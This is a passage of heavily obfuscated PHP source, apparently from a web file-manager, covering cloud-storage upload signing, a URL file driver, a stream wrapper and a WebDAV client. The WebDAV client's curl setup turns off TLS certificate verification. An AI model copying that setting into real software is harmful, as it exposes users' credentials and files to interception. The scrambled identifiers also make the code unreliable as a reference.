$c¬¡¥ßŠèŒ); return !$b‚ÏËÏ²‘[$c™ÄÕù½†“[1025]] ? $b‚ÏËÏ²‘[$c™ÄÕù½†“[1025]] : $b‚ÏËÏ²‘[$c™ÄÕù½†“[1027]]; } public function uploadFormData($B›ê•“õ‹‚, $e‚šÙÂš¸ø = 3600) { return $this->uploadPolicy($B›ê•“õ‹‚, $e‚šÙÂš¸ø); } public function multiUploadFormData($e¾ÅÁŠÓšŸ, $e¿íÙƒ‰­ = 3600) { $BËâøÒÙ†á =& $_SERVER[Î¿—”òá]; $BÀ†ä÷ã¯Ñ = (int) $GLOBALS[$BËâøÒÙ†á[7]][$BËâøÒÙ†á[77]]; return $this->uploadPolicy($e¾ÅÁŠÓšŸ, $e¿íÙƒ‰­, $BÀ†ä÷ã¯Ñ); } private function uploadPolicy($bÄ±½ÃÛØ, $a¯­Ï‹˜Å = 3600, $C“âŸïÏğÕ = 0) { goto fˆùÉö˜×²; fˆùÉö˜×²: $C¼êÃ¡œ‘ =& $_SERVER[Î¿—”òá]; $BˆåÓéÃÛ· = $C¼êÃ¡œ‘[8] . $this->bucket; $e†×¿ëµ™ = gmdate($C¼êÃ¡œ‘[1198]); goto b¢¯”ËÑ¦ˆ; d¬áÍÛñå: $e­êëÖ²×• = base64_encode(hash_hmac($C¼êÃ¡œ‘[1235], "\x50\x4f\x53\124\x26{$BˆåÓéÃÛ·}\x26{$e†×¿ëµ™}\x26{$B¼‰Ñ×¿ñ»}", md5("{$this->userpass}"), !0)); $BÙµ“ñ‹Õ = array($C¼êÃ¡œ‘[1105] => $B¼‰Ñ×¿ñ», $C¼êÃ¡œ‘[1269] => "\125\120\131\x55\116\x20{$this->username}\x3a{$e­êëÖ²×•}", $C¼êÃ¡œ‘[169] => $this->endpoint . $BˆåÓéÃÛ·); return $BÙµ“ñ‹Õ; goto bóìÄ»ê; b¢¯”ËÑ¦ˆ: $a‹‰—ñßà = array($C¼êÃ¡œ‘[1265] => $this->bucket, $C¼êÃ¡œ‘[1266] => $bÄ±½ÃÛØ, $C¼êÃ¡œ‘[1267] => time() + $a¯­Ï‹˜Å, $C¼êÃ¡œ‘[1268] => $e†×¿ëµ™); if ($C“âŸïÏğÕ) { $a‹‰—ñßà[$C¼êÃ¡œ‘[1184]] = $C“âŸïÏğÕ; } $B¼‰Ñ×¿ñ» = base64_encode(json_encode($a‹‰—ñßà)); goto d¬áÍÛñå; bóìÄ»ê: } public function download($A¿ÑµËæŠ–, $F‡·ª¾›Â™) { goto eÛ¼èªš”Ö; dİõ”Àğù: fclose($Eï¾×¬½‡); return $F‡·ª¾›Â™; goto eÜ±Ï¤£Ğ; eÛ¼èªš”Ö: $EÓ†•ßİ = IO::getPathInner(IO::mkfile($F‡·ª¾›Â™)); if (!($câæíê‡§‰ = $this->link($A¿ÑµËæŠ–))) { return !1; } $e·ø¨×²Ş¼ = 0; goto A¨¼Â¼¯ï; A¨¼Â¼¯ï: $CÖêš²£Õƒ = 1024 * 200; $Eï¾×¬½‡ = fopen($EÓ†•ßİ, $_SERVER[Î¿—”òá][1219]); while (!0) { $AóÇ¢ÙÈ÷§ = $this->fileSubstr($A¿ÑµËæŠ–, $e·ø¨×²Ş¼, $CÖêš²£Õƒ); if ($AóÇ¢ÙÈ÷§ === !1) { return !1; } fwrite($Eï¾×¬½‡, $AóÇ¢ÙÈ÷§); $e·ø¨×²Ş¼ += $CÖêš²£Õƒ; if (strlen($AóÇ¢ÙÈ÷§) < $CÖêš²£Õƒ) { break; } } goto dİõ”Àğù; eÜ±Ï¤£Ğ: } public function link($CçÚŞË™Å, $a¹ºŒè = array()) { $f‚©ê¸²†Î =& $_SERVER[Î¿—”òá]; $CçÚŞË™Å = trim($CçÚŞË™Å, $f‚©ê¸²†Î[8]); if (!empty($this->token)) { $F²ô–½÷ = strtotime(date($f‚©ê¸²†Î[1270])); $a‡Ú¥°çî† = substr(md5($this->token . $f‚©ê¸²†Î[272] . $F²ô–½÷ . $f‚©ê¸²†Î[1271] . $CçÚŞË™Å), 12, 8) . $F²ô–½÷; $a¹ºŒè[] = $f‚©ê¸²†Î[1272] . $a‡Ú¥°çî†; } $bÔƒ¹Í•öñ = !empty($a¹ºŒè) ? $f‚©ê¸²†Î[69] . implode($f‚©ê¸²†Î[272], $a¹ºŒè) : $f‚©ê¸²†Î[33]; return $this->getHost() . $f‚©ê¸²†Î[8] . $CçÚŞË™Å . $bÔƒ¹Í•öñ; } public function fileOut($aæÙÉˆ­, $d’Ëíï›ø„ = false, $b‚×‘ŠÖ = false, $aøË°×ù«Ì = '') { if (!$b‚×‘ŠÖ) { $b‚×‘ŠÖ = $this->pathThis($aæÙÉˆ­); } $bÆ¨–¢‡®ù = $d’Ëíï›ø„ ? array($_SERVER[Î¿—”òá][1273] . rawurlencode($b‚×‘ŠÖ)) : array(); $A¦½Éİä©Æ = $this->link($aæÙÉˆ­, $bÆ¨–¢‡®ù); $this->fileOutLink($A¦½Éİä©Æ); } public function fileOutServer($cÊ¸¼¢²¤Ö, $CæŠøĞôŸĞ = false, $f÷š‡¨‚• = false, $E„Õ‡á“° = '') { parent::fileOut($cÊ¸¼¢²¤Ö, $CæŠøĞôŸĞ, $f÷š‡¨‚•, $E„Õ‡á“°); } public function fileOutImage($fƒè¤šÔŠƒ, $A°¸È«õˆ¾ = 250) { $Eá…¾Ô‚Õ = $this->link($fƒè¤šÔŠƒ . $_SERVER[Î¿—”òá][1274] . $A°¸È«õˆ¾); $this->fileOutLink($Eá…¾Ô‚Õ); } public function fileOutImageServer($Càù‚àø§Ã, $AÃˆ¥¨Ã = 250) { parent::fileOutImage($Càù‚àø§Ã, $AÃˆ¥¨Ã); } public function hashMd5($F¤ŠçË›Œ) { $fÉÅ†ùŸç÷ =& $_SERVER[Î¿—”òá]; $cë¨æóğª¯ = $this->objectMeta($F¤ŠçË›Œ); return isset($cë¨æóğª¯[$fÉÅ†ùŸç÷[196]]) ? $cë¨æóğª¯[$fÉÅ†ùŸç÷[196]] : !1; } public function size($A¹â»Ğì) { $F›èŒ¦ğ“„ = $this->objectMeta($A¹â»Ğì); return $F›èŒ¦ğ“„ ? $F›èŒ¦ğ“„[$_SERVER[Î¿—”òá][77]] : 0; } public function info($Cçæ­İ¡ì´) { if ($this->isFolder($Cçæ­İ¡ì´)) { return $this->folderInfo($Cçæ­İ¡ì´); } else { if ($this->isFile($Cçæ­İ¡ì´)) { return $this->fileInfo($Cçæ­İ¡ì´); } } return !1; } public function exist($dÔÅáºåİã) { return $this->isFile($dÔÅáºåİã) || $this->isFolder($dÔÅáºåİã); } public function isFile($CÑ“ÉŒ•íõ) { return !$this->isFolder($CÑ“ÉŒ•íõ) && $this->objectMeta($CÑ“ÉŒ•íõ); } public function isFolder($fÜ½²¼×„³) { return $this->cacheMethod($_SERVER[Î¿—”òá][223], $fÜ½²¼×„³); } protected function objectMeta($c…Šš×£Øë) { return $this->cacheMethod($_SERVER[Î¿—”òá][224], $c…Šš×£Øë); } protected function _objectMeta($e¬§¢¶‡ã›) { goto AË³ñ·  ’; FèÊ‹¼‡Ùñ: $E†«÷ùƒŠ  = array($fª„ÜÅàä­[28] => get_path_this($e¬§¢¶‡ã›), $fª„ÜÅàä­[29] => isset($A êØ®âÂ[$fª„ÜÅàä­[1276]]) ? $A êØ®âÂ[$fª„ÜÅàä­[1276]] : null, $fª„ÜÅàä­[77] => isset($A êØ®âÂ[$fª„ÜÅàä­[1277]]) ? $A êØ®âÂ[$fª„ÜÅàä­[1277]] : null, $fª„ÜÅàä­[196] => isset($A êØ®âÂ[$fª„ÜÅàä­[1278]]) ? $A êØ®âÂ[$fª„ÜÅàä­[1278]] : null, $fª„ÜÅàä­[1246] => isset($A êØ®âÂ[$fª„ÜÅàä­[1279]]) ? $A êØ®âÂ[$fª„ÜÅàä­[1279]] : null); $E†«÷ùƒŠ [$fª„ÜÅàä­[1247]] = isset($A êØ®âÂ[$fª„ÜÅàä­[1280]]) ? strtotime($A êØ®âÂ[$fª„ÜÅàä­[1280]]) : $E†«÷ùƒŠ [$fª„ÜÅàä­[1246]]; return $E†«÷ùƒŠ ; goto dë’¢¨–ì; e›¬ùÅœºÌ: if (!$d×¹»Œµö‰[$fª„ÜÅàä­[1025]]) { return null; } $A êØ®âÂ = isset($d×¹»Œµö‰[$fª„ÜÅàä­[1027]]) ? $d×¹»Œµö‰[$fª„ÜÅàä­[1027]] : array(); if (!isset($A êØ®âÂ[$fª„ÜÅàä­[1276]])) { return null; } goto FèÊ‹¼‡Ùñ; AË³ñ·  ’: $fª„ÜÅàä­ =& $_SERVER[Î¿—”òá]; if ($e¬§¢¶‡ã› == $fª„ÜÅàä­[33] || $e¬§¢¶‡ã› == $fª„ÜÅàä­[8]) { return array(); } $d×¹»Œµö‰ = $this->ussRequest($e¬§¢¶‡ã›, $fª„ÜÅàä­[1275]); goto e›¬ùÅœºÌ; dë’¢¨–ì: } protected function _isFolder($e×›ùâÏ) { $A„´Ä‘†°„ =& $_SERVER[Î¿—”òá]; if ($e×›ùâÏ == $A„´Ä‘†°„[33] || $e×›ùâÏ == $A„´Ä‘†°„[8]) { return !0; } $CˆÙ»ñ­¶ = $this->objectMeta($e×›ùâÏ); return isset($CˆÙ»ñ­¶[$A„´Ä‘†°„[29]]) && $CˆÙ»ñ­¶[$A„´Ä‘†°„[29]] == $A„´Ä‘†°„[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($F†ù‡ÁÏì¤ = false) { } public function exist($Cùğ²ÖÌï) { $fİİŒŸ¦‡¥ = $this->info($Cùğ²ÖÌï); return $fİİŒŸ¦‡¥[$_SERVER[Î¿—”òá][188]]; } public function isFile($Bˆù¢ƒ†°ò) { $d²²ÌÎ»´È = $this->info($Bˆù¢ƒ†°ò); return $d²²ÌÎ»´È[$_SERVER[Î¿—”òá][188]]; } public function isFolder($fĞùãÊÀìÎ) { return !1; } public function size($aÍø«á’Ÿ›) { $Cßˆ‘’ãäˆ = $this->info($aÍø«á’Ÿ›); return $Cßˆ‘’ãäˆ[$_SERVER[Î¿—”òá][77]]; } public function info($añÑŠ…§«¡) { return $this->infoParse($añÑŠ…§«¡); } public function infoAuth($D…ºˆ—Ç´ó) { return $this->infoParse($D…ºˆ—Ç´ó); } public function infoWithChildren($cÉ†Ğ¥ÓŸ) { return $this->infoParse($cÉ†Ğ¥ÓŸ); } public function infoFull($dÓÄç¤‡†¹) { return $this->infoParse($dÓÄç¤‡†¹); } private function infoParse($dé„ª–›Ù) { $cÜñ«á„Å =& $_SERVER[Î¿—”òá]; $aïõ¿ËÖ¯ = $this->header($dé„ª–›Ù); if (!$aïõ¿ËÖ¯ || !$aïõ¿ËÖ¯[$cÜñ«á„Å[685]]) { return !1; } $E°¼Â»§¯è = _get($aïõ¿ËÖ¯, $cÜñ«á„Å[325], 0); $C†³‰±¾Ä¦ = array($cÜñ«á„Å[28] => $aïõ¿ËÖ¯[$cÜñ«á„Å[28]], $cÜñ«á„Å[75] => $dé„ª–›Ù, $cÜñ«á„Å[29] => $cÜñ«á„Å[167], $cÜñ«á„Å[77] => intval($E°¼Â»§¯è), $cÜñ«á„Å[160] => get_path_ext($aïõ¿ËÖ¯[$cÜñ«á„Å[28]]), $cÜñ«á„Å[1155] => $E°¼Â»§¯è > 0 && $aïõ¿ËÖ¯[$cÜñ«á„Å[1281]], $cÜñ«á„Å[1156] => !1); return $C†³‰±¾Ä¦; } private function header($E½ÁñÈÉ) { if (isset(self::$_cacheHeader[$E½ÁñÈÉ])) { return self::$_cacheHeader[$E½ÁñÈÉ]; } self::$_cacheHeader[$E½ÁñÈÉ] = url_header($E½ÁñÈÉ); return self::$_cacheHeader[$E½ÁñÈÉ]; } public function hashSimple($a‹¹Šó¹Ï¿, $c Á‹•¢çÛ = false) { goto Fõ‘îöŸÛÄ; D¹–©Õ™Ó: $A–‘Ê¤¶ÁÁ = timeFloat(); $A¸Óíøï = 15; for ($B…ïÍŠÊŒŞ = 0; $B…ïÍŠÊŒŞ < $F‡„ğ·Íà; $B…ïÍŠÊŒŞ++) { if (timeFloat() - $A–‘Ê¤¶ÁÁ > $A¸Óíøï) { return !1; } $fì«¤¿Ìµª = $this->fileSubstr($a‹¹Šó¹Ï¿, $A›‹¸òĞåÍ * $B…ïÍŠÊŒŞ, $F–ô™¹­‹); if (!$fì«¤¿Ìµª) { return !1; } $e—ÈÙèĞ¼ .= $fì«¤¿Ìµª; } goto F‰ŒÃË§†; F‰ŒÃË§†: $e—ÈÙèĞ¼ .= $this->fileSubstr($a‹¹Šó¹Ï¿, $F‰ï‹¯Š¾ - $F–ô™¹­‹, $F–ô™¹­‹); return md5($e—ÈÙèĞ¼) . $F‰ï‹¯Š¾; goto B£½Ô˜¹; E‚‘Éá˜»: if ($F‰ï‹¯Š¾ <= $F–ô™¹­‹ * $F‡„ğ·Íà) { return md5($this->fileSubstr($a‹¹Šó¹Ï¿, 0, $F‰ï‹¯Š¾)) . $F‰ï‹¯Š¾; } $A›‹¸òĞåÍ = intval($F‰ï‹¯Š¾ / $F‡„ğ·Íà); $e—ÈÙèĞ¼ = $A³Ş‘ù»Ïå[33]; goto D¹–©Õ™Ó; Fõ‘îöŸÛÄ: $A³Ş‘ù»Ïå =& $_SERVER[Î¿—”òá]; $Dµà‘È†è = $this->info($a‹¹Šó¹Ï¿); if (!$Dµà‘È†è || !$Dµà‘È†è[$A³Ş‘ù»Ïå[188]]) { return !1; } goto C²œÀôÍã; C²œÀôÍã: $F‰ï‹¯Š¾ = $Dµà‘È†è[$A³Ş‘ù»Ïå[77]]; $F–ô™¹­‹ = 200; $F‡„ğ·Íà = 50; goto E‚‘Éá˜»; B£½Ô˜¹: } public function getContent($dÃ™ÓÇ¶) { return $this->fileSubstr($dÃ™ÓÇ¶); } public function fileSubstr($bô°ãõÈ™, $c÷Ïù¹™É­ = 0, $B‡®âïµ§ = -1) { goto f™àêÍ¸; d– …›Ğàº: $AÌÈ•±ƒ²¦ = url_request($bô°ãõÈ™, $eóÊÑ×¤ˆ[216], !1, $e¦“×˜¬¹, !1, !1, 1); return $AÌÈ•±ƒ²¦[$eóÊÑ×¤ˆ[1027]] ? $AÌÈ•±ƒ²¦[$eóÊÑ×¤ˆ[1027]] : $eóÊÑ×¤ˆ[33]; goto C÷¸Œ¬“Æ; f™àêÍ¸: $eóÊÑ×¤ˆ =& $_SERVER[Î¿—”òá]; $c¨¸†ˆî²¦ = $this->info($bô°ãõÈ™); if (!$c¨¸†ˆî²¦ || !$c¨¸†ˆî²¦[$eóÊÑ×¤ˆ[188]] && $c¨¸†ˆî²¦[$eóÊÑ×¤ˆ[77]] > 1024 * 1024 * 10) { return !1; } goto AÎÈÃ†À®ù; AÎÈÃ†À®ù: if ($B‡®âïµ§ === -1) { $B‡®âïµ§ = $c¨¸†ˆî²¦[$eóÊÑ×¤ˆ[77]]; } if ($B‡®âïµ§ == 0) { return $eóÊÑ×¤ˆ[33]; } $e¦“×˜¬¹ = array($eóÊÑ×¤ˆ[1282] . $c÷Ïù¹™É­ . $eóÊÑ×¤ˆ[712] . ($c÷Ïù¹™É­ + $B‡®âïµ§ - 1)); goto d– …›Ğàº; C÷¸Œ¬“Æ: } public function download($Dè¢Îã“³, $dÙƒ‚½ã®“) { Downloader::start($Dè¢Îã“³, $dÙƒ‚½ã®“); return $dÙƒ‚½ã®“; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($d‘ÒØ’ƒ³, $cÓàÌ‘·” = '') { goto FŸ¶Š¿ÑÊè; FŸ¶Š¿ÑÊè: $this->info = $this->info($d‘ÒØ’ƒ³); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Î¿—”òá][75]]; goto c«È„Ğá‰¹; d—÷»³ÄšÃ: return $this->info ? !0 : !1; goto a÷¯àø±æ‰; c«È„Ğá‰¹: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$d‘ÒØ’ƒ³])) { self::$_chunkBuffer[$d‘ÒØ’ƒ³] = array(); } goto d—÷»³ÄšÃ; a÷¯àø±æ‰: } function stream_read($aôá¢Õ“²ì) { $D½‰¨¾î¿ = $this->fileSubstr($this->pose, $aôá¢Õ“²ì); $this->pose += strlen($D½‰¨¾î¿); return $D½‰¨¾î¿; } public function stream_tell() { return $this->pose; } public function stream_seek($BµùĞãìº, $dó­´ë„“Ê) { $c¿—Â¢˜Ãõ =& $_SERVER[Î¿—”òá]; if ($dó­´ë„“Ê == SEEK_SET) { $this->pose = $BµùĞãìº; } else { if ($dó­´ë„“Ê == SEEK_CUR) { $this->pose += $BµùĞãìº; } else { if ($dó­´ë„“Ê == SEEK_END) { $this->pose = $this->info[$c¿—Â¢˜Ãõ[77]] + intval($BµùĞãìº); } } } if ($BµùĞãìº < 0) { $this->pose = $this->info[$c¿—Â¢˜Ãõ[77]] + $BµùĞãìº; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Î¿—”òá][77]]; } public function stream_close() { return !0; } public function url_stat($Dƒƒ­ÕöÙ, $C¶¼´–öî×) { $AàÚ—Úƒ =& $_SERVER[Î¿—”òá]; $D”Ì÷¬ñ’“ = $this->info($Dƒƒ­ÕöÙ); return array($AàÚ—Úƒ[1283] => 0, $AàÚ—Úƒ[1284] => 0, $AàÚ—Úƒ[12] => 32768 + 511, $AàÚ—Úƒ[1285] => 0, $AàÚ—Úƒ[1286] => 0, $AàÚ—Úƒ[1287] => 0, $AàÚ—Úƒ[1288] => 0, $AàÚ—Úƒ[77] => $D”Ì÷¬ñ’“[$AàÚ—Úƒ[77]], $AàÚ—Úƒ[1289] => $D”Ì÷¬ñ’“[$AàÚ—Úƒ[1161]], $AàÚ—Úƒ[1247] => $D”Ì÷¬ñ’“[$AàÚ—Úƒ[107]], $AàÚ—Úƒ[1246] => $D”Ì÷¬ñ’“[$AàÚ—Úƒ[187]], $AàÚ—Úƒ[1290] => 0, $AàÚ—Úƒ[1291] => 0); } static $fileInfo = array(); public function info($aºÇì´¦äÕ) { $DÄ»ã†óˆè = $_SERVER[Î¿—”òá][1292]; if (isset(self::$fileInfo[$aºÇì´¦äÕ])) { return self::$fileInfo[$aºÇì´¦äÕ]; } if (substr($aºÇì´¦äÕ, 0, strlen($DÄ»ã†óˆè)) != $DÄ»ã†óˆè) { return !1; } self::$fileInfo[$aºÇì´¦äÕ] = IO::info(substr($aºÇì´¦äÕ, strlen($DÄ»ã†óˆè))); return self::$fileInfo[$aºÇì´¦äÕ]; } public static function read($bÉ˜Æß÷, $eÆ”£™Šù, $AÑÂÊÈ”é) { goto b·¶†øåÈõ; D¨ŠÙ³»ä: $fÒ´İ®«ÄÕ = 8192; fseek($E¢êÏÂ•„¤, $eÆ”£™Šù, SEEK_SET); $D˜ËêÏå = $DÆä•æê‰[33]; goto aˆåÄËšÁÃ; aˆåÄËšÁÃ: $Eƒ•Îò¦µ = 0; while ($Eƒ•Îò¦µ < $AÑÂÊÈ”é) { $Eğ° ²¸¯ = min($fÒ´İ®«ÄÕ, $AÑÂÊÈ”é - $Eƒ•Îò¦µ); $D˜ËêÏå .= fread($E¢êÏÂ•„¤, $Eğ° ²¸¯); $Eƒ•Îò¦µ += $Eğ° ²¸¯; } fclose($E¢êÏÂ•„¤); goto AÆÂØœƒ…š; AÆÂØœƒ…š: return $D˜ËêÏå; goto c•÷å¾¡Ôó; b·¶†øåÈõ: $DÆä•æê‰ =& $_SERVER[Î¿—”òá]; $E¢êÏÂ•„¤ = fopen($bÉ˜Æß÷, $DÆä•æê‰[1163]); if (!$E¢êÏÂ•„¤) { return $DÆä•æê‰[33]; } goto D¨ŠÙ³»ä; c•÷å¾¡Ôó: } public function fileSubstr($A‹™¨Ú±Üô, $C†‡¨•ª“) { goto aÑÂÃßµ‡Ş; eÉß…Ò’ß: $EãÙï‡’Ÿ• = 64 * 1024; $Cöù¦ñØà =& self::$_chunkBuffer[$this->path]; if (!$Cöù¦ñØà) { $Cöù¦ñØà = array(); } goto Aì’ÓŞ¢³ç; dìñ¹íŠƒ›: ksort($Cöù¦ñØà); $c‚Ñèá§…Á = substr($CÈ“«¢„œÅ, $A‹™¨Ú±Üô - $F‚È÷˜¶·¢, $C†‡¨•ª“); return $c‚Ñèá§…Á; goto BŒÍª›‚÷; DÇÔìô‚ç: $f‚Æ˜Ù‹áä = $C†‡¨•ª“; if ($A‹™¨Ú±Üô < 0) { $A‹™¨Ú±Üô = $CŒ¨Ô²î°Î + $A‹™¨Ú±Üô; } if ($C†‡¨•ª“ === !1) { $C†‡¨•ª“ = $CŒ¨Ô²î°Î - $A‹™¨Ú±Üô; } goto aõµËÒŸ•; Aì’ÓŞ¢³ç: $C…¬ç¦‰ù© = 0; $D¶ßîö÷Ù = 0; $e¶Ù¹ÒÅïŠ = $B£ÊˆÔ™ÀÜ[33]; goto eœôŠ±æ­; aõµËÒŸ•: if ($A‹™¨Ú±Üô + $C†‡¨•ª“ > $CŒ¨Ô²î°Î) { $C†‡¨•ª“ = $CŒ¨Ô²î°Î - $A‹™¨Ú±Üô; } if ($C†‡¨•ª“ <= 0) { return $B£ÊˆÔ™ÀÜ[33]; } if ($A‹™¨Ú±Üô < 0 || $A‹™¨Ú±Üô >= $CŒ¨Ô²î°Î || $C†‡¨•ª“ <= 0 || $C†‡¨•ª“ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\154\145\122\145\x61\144\40\x65\162\162\157\162\x21\40\x73\x74\141\x72\x74\x3d{$A‹™¨Ú±Üô}\73\x6c\x65\156\147\x74\150\75{$C†‡¨•ª“}\x3b\40\163\x69\x7a\x65\x3d{$CŒ¨Ô²î°Î}\x3b"); } goto eÉß…Ò’ß; eó÷ãÍ”Ï: $cÏÌšå£¨ = ceil(($A‹™¨Ú±Üô + $C†‡¨•ª“) / $EãÙï‡’Ÿ•) * $EãÙï‡’Ÿ• - $F‚È÷˜¶·¢; $CÈ“«¢„œÅ = IO::fileSubstr($this->path, $F‚È÷˜¶·¢, $cÏÌšå£¨); $Cöù¦ñØà[$F‚È÷˜¶·¢ . $B£ÊˆÔ™ÀÜ[33]] = $CÈ“«¢„œÅ; goto dìñ¹íŠƒ›; eœôŠ±æ­: foreach ($Cöù¦ñØà as $C…¬ç¦‰ù© => $e¶Ù¹ÒÅïŠ) { $C…¬ç¦‰ù© = intval($C…¬ç¦‰ù©); $D¶ßîö÷Ù = $C…¬ç¦‰ù© + strlen($e¶Ù¹ÒÅïŠ); if ($A‹™¨Ú±Üô >= $D¶ßîö÷Ù) { continue; } if ($A‹™¨Ú±Üô >= $C…¬ç¦‰ù© && $A‹™¨Ú±Üô + $C†‡¨•ª“ <= $D¶ßîö÷Ù) { return substr($e¶Ù¹ÒÅïŠ, $A‹™¨Ú±Üô - $C…¬ç¦‰ù©, $C†‡¨•ª“); } break; } if (count($Cöù¦ñØà) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($B£ÊˆÔ™ÀÜ[1293], $B£ÊˆÔ™ÀÜ[1294] . count($Cöù¦ñØà) . "\x3b\x73\164\141\x72\164\x3d{$A‹™¨Ú±Üô}\54\154\x65\156\147\164\150\75{$C†‡¨•ª“}\x3b\x70\x6f\x73\x65\72{$C…¬ç¦‰ù©}\176{$D¶ßîö÷Ù}"); throw new Exception($B£ÊˆÔ™ÀÜ[1295]); } $F‚È÷˜¶·¢ = intval($A‹™¨Ú±Üô / $EãÙï‡’Ÿ•) * $EãÙï‡’Ÿ•; goto eó÷ãÍ”Ï; aÑÂÃßµ‡Ş: $B£ÊˆÔ™ÀÜ =& $_SERVER[Î¿—”òá]; $CŒ¨Ô²î°Î = $this->info[$B£ÊˆÔ™ÀÜ[77]]; $d¨êÙ¦¬¹Ô = $A‹™¨Ú±Üô; goto DÇÔìô‚ç; BŒÍª›‚÷: } private function log($f–…°ªß¹Š, $e´¡çê¹ƒ®) { $C¢Ú›©šÈ¬ =& $_SERVER[Î¿—”òá]; $DÄâÉ±Ö = timeFloat() - $this->timeStart; write_log(sprintf($C¢Ú›©šÈ¬[1296], $f–…°ªß¹Š, $this->info[$C¢Ú›©šÈ¬[28]], $DÄâÉ±Ö, $e´¡çê¹ƒ®), $C¢Ú›©šÈ¬[1212]); } } goto CÚŸåÙƒ‘Û; dœ„µäöĞö: class HttpDavClient { public function __construct($cİ´ƒÏºÌ, $e¬ÑÜÕ´Ã¾, $b”à÷†ç²) { $this->header = array(); $this->userName = $e¬ÑÜÕ´Ã¾; $this->userPassowrd = $b”à÷†ç²; } protected function makePath($bŒ”¢ÌŠÑô) { return $bŒ”¢ÌŠÑô; } protected function setHeader($DØ†âšéáÜ, $fçˆ¥ŠˆØÜ = false) { if ($fçˆ¥ŠˆØÜ === !1) { $this->header[] = $DØ†âšéáÜ; } else { $this->header[] = $DØ†âšéáÜ . $_SERVER[Î¿—”òá][873] . $fçˆ¥ŠˆØÜ; } } public function move($cˆù¡¥Ëà„, $Dµ‘ÁÏ«í°, $EÌİ»Ãõ· = '') { $eÛ‚«…æöÅ =& $_SERVER[Î¿—”òá]; $this->setHeader($eÛ‚«…æöÅ[1761], $this->makePath($Dµ‘ÁÏ«í°)); $this->setHeader($eÛ‚«…æöÅ[1762], $eÛ‚«…æöÅ[1763]); if ($EÌİ»Ãõ·) { $this->setHeader($eÛ‚«…æöÅ[1764], $eÛ‚«…æöÅ[918] . $EÌİ»Ãõ· . $eÛ‚«…æöÅ[921]); } return $this->send($eÛ‚«…æöÅ[1765], $cˆù¡¥Ëà„); } public function copy($bë˜ŠÑŒ¢œ, $EŞä¸àé˜º) { $A¡Ãâ¹®™Ñ =& $_SERVER[Î¿—”òá]; $this->setHeader($A¡Ãâ¹®™Ñ[1761], $this->makePath($EŞä¸àé˜º)); $this->setHeader($A¡Ãâ¹®™Ñ[1762], $A¡Ãâ¹®™Ñ[1763]); return $this->send($A¡Ãâ¹®™Ñ[1766], $bë˜ŠÑŒ¢œ); } public function mkcol($cçŸÏİ—ï) { $fÌ¦¢»œóÍ =& $_SERVER[Î¿—”òá]; $this->setHeader($fÌ¦¢»œóÍ[1762], $fÌ¦¢»œóÍ[1763]); return $this->send($fÌ¦¢»œóÍ[1767], $cçŸÏİ—ï); } public function delete($fŸ¬Š­Ø, $cµõ—‹”Æš = '') { $d¾»Ô²¼Û‘ =& $_SERVER[Î¿—”òá]; if ($cµõ—‹”Æš) { $this->setHeader($d¾»Ô²¼Û‘[1764], $d¾»Ô²¼Û‘[918] . $cµõ—‹”Æš . $d¾»Ô²¼Û‘[921]); } return $this->send($d¾»Ô²¼Û‘[1244], $fŸ¬Š­Ø); } public function propfind($bèõñ¹×) { $d‡Ø¤Ûáˆ¿ =& $_SERVER[Î¿—”òá]; $this->setHeader($d‡Ø¤Ûáˆ¿[1768], $d‡Ø¤Ûáˆ¿[83]); $this->setHeader($d‡Ø¤Ûáˆ¿[1769], $d‡Ø¤Ûáˆ¿[1770]); $cÚÜÑ¹Á = $d‡Ø¤Ûáˆ¿[1771]; return $this->send($d‡Ø¤Ûáˆ¿[1772], $bèõñ¹×, $cÚÜÑ¹Á); } public function options($bê„ÉÁÙí) { return $this->send($_SERVER[Î¿—”òá][1773], $bê„ÉÁÙí); } public function get($E¬…ˆï„) { return $this->send($_SERVER[Î¿—”òá][216], $E¬…ˆï„); } public function put($FÈÊ¯¼£¿ã, $Eœµ÷ËÚ·, $cİ¹â‹™”Ÿ = '') { $EÖÔÈ˜ç¹ =& $_SERVER[Î¿—”òá]; if ($cİ¹â‹™”Ÿ) { $this->setHeader($EÖÔÈ˜ç¹[1764], $EÖÔÈ˜ç¹[918] . $cİ¹â‹™”Ÿ . $EÖÔÈ˜ç¹[921]); } return $this->send($EÖÔÈ˜ç¹[214], $FÈÊ¯¼£¿ã, $Eœµ÷ËÚ·); } protected function send($bÇ¿çºÁá, $d£ÇŒì¾„å, $EƒìÁõè = false, $dŸõŒö©£Æ = false) { goto CÒãÈæÎºŒ; CÒãÈæÎºŒ: $CÃâ™Â³»Æ =& $_SERVER[Î¿—”òá]; $F‡ñ‰ Ÿ“ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($CÃâ™Â³»Æ[1774], $CÃâ™Â³»Æ[50]); goto F‡ß‘©Ï™Ü; eô¢ù³‰­: $this->header = array(); return $bŠ×ø”ò³; goto fğ¨™à¡ˆ; F‡ß‘©Ï™Ü: $this->setHeader($F‡ñ‰ Ÿ“); if ($EƒìÁõè) { $EƒìÁõè = $CÃâ™Â³»Æ[1775] . $EƒìÁõè; } if (!request_url_safe($d£ÇŒì¾„å)) { return !1; } goto D¦éÕÇë; B„ôÀƒ±§: curl_setopt($DÒè‹÷¢“Ë, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($DÒè‹÷¢“Ë, CURLOPT_SSL_VERIFYHOST, !1); $bŠ×ø”ò³ = curl_exec($DÒè‹÷¢“Ë); goto eô¢ù³‰­; D¦éÕÇë: $DÒè‹÷¢“Ë = curl_init($d£ÇŒì¾„å); curl_setopt($DÒè‹÷¢“Ë, CURLOPT_CUSTOMREQUEST, $bÇ¿çºÁá); curl_setopt($DÒè‹÷¢“Ë, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto D•£ã¼Ã‡„; D•£ã¼Ã‡„: curl_setopt($DÒè‹÷¢“Ë, CURLOPT_HTTPHEADER, $this->header); curl_setopt($DÒè‹÷¢“Ë, CURLOPT_RETURNTRANSFER, !0); curl_setopt($DÒè‹÷¢“Ë, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto 